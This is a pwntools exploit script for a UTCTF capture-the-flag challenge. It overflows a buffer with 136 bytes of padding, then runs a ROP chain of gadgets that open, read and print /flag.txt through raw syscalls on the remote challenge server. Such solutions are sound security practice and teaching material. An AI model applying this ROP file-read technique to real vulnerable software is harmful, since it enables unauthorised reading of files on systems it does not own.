#!/usr/bin/env python3

from pwn import *

exe = ELF("chal")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("challenge.utctf.live", 5141)

    return r


def main():
    r = conn()
    rop = ROP(exe)

    # Some gadgets
    mov_qword_rdx_rax = 0x0000000000419e38      # mov qword ptr [rdx], rax; ret;
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    payload = flat(
                b"A" * 136,     # PADDING

                # NOTE: In local just remove "/" and the second mov_qword
                pop_rax, 0x78742e67616c662f,    # RAX = "/flag.tx" (in hex little-endian)
                pop_rdx, 0x4c6000, 0x1,         # RDX = &"/flag.txt"; RBX = dummy
                mov_qword_rdx_rax,

                pop_rax, 0x74,                  # "t" (last char for the path)
                pop_rdx, 0x4c6008, 0x1,
                mov_qword_rdx_rax,

                pop_rdi, 0x4c6000,          # RDI = &"/flag.txt"
                pop_rsi, 0,                 # RSI = O_RDONLY
                pop_rax, 2,                 # RAX = 2 (open)
                syscall,                    # open("/flag.txt", O_RDONLY)

                # NOTE: In local the fd is (almost) always 3
                pop_rdi, 5,                 # RDI = fd
                pop_rsi, 0x4c6010,          # RSI = buffer
                pop_rdx, 0x40, 0x1,         # RDX = size; RBX = dummy
                pop_rax, 0,
                syscall,                    # read(fd, buf, 0x40)

                pop_rdi, 1,                 # RDI = stdout
                pop_rsi, 0x4c6010,          # RSI = buffer
                pop_rdx, 0x40, 0x1,         # RDX = size; RBX = dummy
                pop_rax, 1,
                syscall,                    # write(1, buf, 0x40)

                pop_rdi, 0,                 # RDI = 0
                pop_rax, 60,                # RAX = 60
                syscall                     # exit(0)
            )

    r.sendlineafter(b"Input> ", payload)
    r.recvuntil(b"Flag: ")
    flag = r.recvline().strip()
    log.success(f"Flag: {flag.decode('ascii')}")


if __name__ == "__main__":
    main()
